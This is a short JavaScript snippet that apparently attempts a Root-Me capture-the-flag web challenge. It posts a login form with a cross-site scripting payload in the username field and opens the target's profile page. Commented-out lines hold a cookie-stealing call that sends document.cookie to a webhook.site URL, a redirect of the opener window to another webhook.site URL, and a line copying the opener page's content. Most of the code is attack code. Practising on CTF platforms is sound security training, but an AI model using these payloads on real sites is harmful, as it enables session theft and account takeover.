//fetch("https://webhook.site/2c4d3b1f-f4f9-4529-8f12-cb941e9745a3?cookie="+document.cookie);
const formData = new FormData();
formData.append('username', '<script>alert(1)</script>');
formData.append('secret', 'mon_secret');

fetch('http://challenge01.root-me.org:58003/login', {
  method: 'POST',
  body: formData
})
.then(res => res.text())
.then(response => {
  console.log('Réponse du serveur :', response);
})
.catch(err => {
  console.error('Erreur :', err);
});
window.open('http://challenge01.root-me.org:58003/profile');
//opener.location = "https://webhook.site/fad3c06f-ed8b-4d27-b880-98f3e78d5a18";
//document.body.innerHTML=opener.document.body.innerHTML